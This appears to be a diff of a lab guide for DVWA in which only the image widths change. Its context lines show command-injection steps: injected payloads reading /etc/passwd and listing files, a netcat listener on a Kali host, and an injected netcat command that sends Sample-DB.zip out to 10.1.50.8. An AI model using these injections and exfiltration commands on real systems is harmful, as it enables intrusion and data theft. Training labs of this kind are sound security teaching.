@@ -8,7 +8,7 @@ Command injection is an attack in which the goal is execution of arbitrary comma
      - Change Impossible to **LOW** and Click Submit
 
      .. image:: ../images/Attacks/Picture6.png
-          :width: 700
+          :width: 850
 #. Performing ‘Command-Injection’ Attack (view /etc/passwd)
      in the data field type the command
 
@@ -17,7 +17,7 @@ Command injection is an attack in which the goal is execution of arbitrary comma
        8.8.8.8 | cat /etc/passwd
       
      .. image:: ../images/Attacks/Picture7.png
-          :width: 700
+          :width: 850
 #. Performing ‘Command-Injection’ Attack (view local directory files)
      in the data field type the command
 
@@ -26,7 +26,7 @@ Command injection is an attack in which the goal is execution of arbitrary comma
        | ls
 
      .. image:: ../images/Attacks/Picture8.png
-          :width: 700
+          :width: 850
 #. Performing ‘Command-Injection’ Attack (data exfiltration using NetCat)
      in Kali Linux Web Shell run the following commands to setup the receiving end of the Data Exfiltration
 
@@ -39,7 +39,7 @@ Command injection is an attack in which the goal is execution of arbitrary comma
        nc -l -p 8888 > Sample-DB.zip
 
      .. image:: ../images/Attacks/Picture9.png
-          :width: 800
+          :width: 850
 #. Performing ‘Command-Injection’ Attack (data exfiltration using NetCat)
      in the DVWA command injection area type the command
 
@@ -48,7 +48,7 @@ Command injection is an attack in which the goal is execution of arbitrary comma
        | nc -w 3 10.1.50.8 8888 < Sample-DB.zip
 
      .. image:: ../images/Attacks/Picture10.png
-          :width: 700
+          :width: 850
 #. Performing ‘Command-Injection’ Attack (data exfiltration using NetCat)
      in the Kali Linux Web Shell the previous command should be completed and a new command line will be available verify size of file exfiltrated using command
 
